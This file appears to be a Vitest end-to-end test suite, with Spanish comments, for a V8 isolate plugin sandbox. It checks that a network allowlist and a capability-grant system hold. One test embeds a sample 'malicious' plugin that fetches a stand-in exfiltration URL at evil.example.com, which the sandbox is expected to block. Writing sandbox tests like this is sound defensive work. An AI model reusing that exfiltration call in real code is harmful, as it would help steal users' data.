// Test end-to-end real del adaptador NodeIsolatedVmAdapter, usando el
// plugin de ejemplo hello-plugin. No es un mock: crea un isolate V8 real,
// hace una llamada de red real a api.github.com (host declarado en el
// manifiesto), y verifica que un host NO autorizado sea bloqueado.
//
// Se ejecuta en CI via .github/workflows/sandbox-e2e.yml (Vitest).

import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { NodeIsolatedVmAdapter } from "../../packages/plugin-sandbox/src/adapters/node-isolated-vm";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PLUGIN_DIR = join(__dirname, "..", "..", "packages", "plugin-sandbox", "examples", "hello-plugin");

function loadIsolatedVmVersion(): string {
  const pkgPath = join(__dirname, "..", "..", "packages", "plugin-sandbox", "node_modules", "isolated-vm", "package.json");
  const pkg = JSON.parse(readFileSync(pkgPath, "utf-8"));
  return pkg.version as string;
}

describe("NodeIsolatedVmAdapter (hello-plugin E2E)", () => {
  it("hello-plugin ejecuta codigo real dentro del isolate y respeta la allowlist de red", async (t) => {
    let installedVersion: string;
    try {
      installedVersion = loadIsolatedVmVersion();
    } catch {
      t.skip("isolated-vm no esta instalado (npm install isolated-vm --workspace=@portaless/plugin-sandbox) -- test omitido, no fallado.");
      return;
    }

    const adapter = new NodeIsolatedVmAdapter({ installedVersion, timeoutMs: 10000 });
    const available = await adapter.isAvailable();
    if (!available) {
      t.skip("isolated-vm no pudo cargarse en este runtime -- test omitido, no fallado.");
      return;
    }

    const manifest = JSON.parse(readFileSync(join(PLUGIN_DIR, "manifest.json"), "utf-8"));
    const code = readFileSync(join(PLUGIN_DIR, "index.js"), "utf-8");
    const granted = new Set(manifest.requestedCapabilities.map((c: { id: string }) => c.id));

    const result = await adapter.execute({
      manifest,
      granted,
      code,
      payload: { hello: "portaless-ci" },
    });

    expect(result.success, `La ejecucion deberia tener exito. Error: ${result.error}`).toBe(true);
    expect(result.provider).toBe("node-isolated-vm");
    expect(result.deniedCapabilityAttempts.length, "No deberia haber intentos denegados con el codigo original de hello-plugin").toBe(0);
    expect(result.durationMs >= 0).toBe(true);
  });

  it("el sandbox bloquea y registra un intento de red hacia un host no autorizado", async (t) => {
    let installedVersion: string;
    try {
      installedVersion = loadIsolatedVmVersion();
    } catch {
      t.skip("isolated-vm no esta instalado -- test omitido.");
      return;
    }

    const adapter = new NodeIsolatedVmAdapter({ installedVersion, timeoutMs: 10000 });
    if (!(await adapter.isAvailable())) {
      t.skip("isolated-vm no disponible en este runtime -- test omitido.");
      return;
    }

    const manifest = {
      name: "malicious-test-plugin",
      version: "0.0.1",
      entry: "index.js",
      runtime: "javascript",
      requestedCapabilities: [
        { id: "network:fetch", allowedHosts: ["api.github.com"], reason: "test" },
      ],
    };
    const maliciousCode = `
      try {
        await fetchAllowed("https://evil.example.com/steal-data");
        "no deberia llegar aqui";
      } catch (err) {
        "bloqueado correctamente: " + err.message;
      }
    `;
    const granted = new Set(["network:fetch"]);

    const result = await adapter.execute({ manifest, granted, code: maliciousCode, payload: {} });

    expect(result.success).toBe(true);
    expect(result.deniedCapabilityAttempts.includes("network:fetch"), "El intento hacia evil.example.com debe quedar registrado como denegado").toBe(true);
  });

  it("el sandbox rechaza capacidades no concedidas aunque el manifiesto las declare", async (t) => {
    let installedVersion: string;
    try {
      installedVersion = loadIsolatedVmVersion();
    } catch {
      t.skip("isolated-vm no esta instalado -- test omitido.");
      return;
    }

    const adapter = new NodeIsolatedVmAdapter({ installedVersion, timeoutMs: 10000 });
    if (!(await adapter.isAvailable())) {
      t.skip("isolated-vm no disponible en este runtime -- test omitido.");
      return;
    }

    const manifest = {
      name: "over-requesting-plugin",
      version: "0.0.1",
      entry: "index.js",
      runtime: "javascript",
      requestedCapabilities: [
        { id: "network:fetch", allowedHosts: ["api.github.com"], reason: "test" },
      ],
    };
    const code = `
      try {
        await fetchAllowed("https://api.github.com/");
        "fetch_ok";
      } catch (err) {
        "fetch_denied";
      }
    `;
    const granted = new Set<string>();

    const result = await adapter.execute({ manifest, granted, code, payload: {} });

    expect(result.success).toBe(true);
    expect(result.deniedCapabilityAttempts.includes("network:fetch"), "Sin concesion explicita del Centro de Permisos, network:fetch debe quedar denegado").toBe(true);
  });
});
